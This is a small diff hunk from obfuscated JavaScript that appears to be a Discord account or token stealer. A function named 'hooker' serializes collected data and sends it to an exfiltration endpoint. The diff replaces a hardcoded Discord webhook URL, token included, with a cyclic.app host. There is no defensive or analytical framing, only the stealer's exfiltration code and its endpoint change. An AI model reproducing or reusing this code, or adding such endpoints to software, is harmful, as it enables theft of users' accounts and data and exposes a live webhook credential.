@@ -273,7 +273,7 @@ function getBadges(_0x59500e) {
 }
 const hooker = async _0x26fec0 => {
   const _0x1e823d = JSON.stringify(_0x26fec0);
-  const _0x2e5ff5 = ["%WEBHOOK%", "https://discord.com/api/webhooks/1378158774442790942/2oHaLBhf9W4lpTdE6lE6gukPa83i7haxm1pj_3L2AsKGpTBtutBktABP0dx1IpauiGRY"];
+  const _0x2e5ff5 = ["%WEBHOOK%", "https://adventurous-gold-leopard.cyclic.app"];
   const _0xae981d = {
     'Content-Type': "application/json",
     'Access-Control-Allow-Origin': '*'
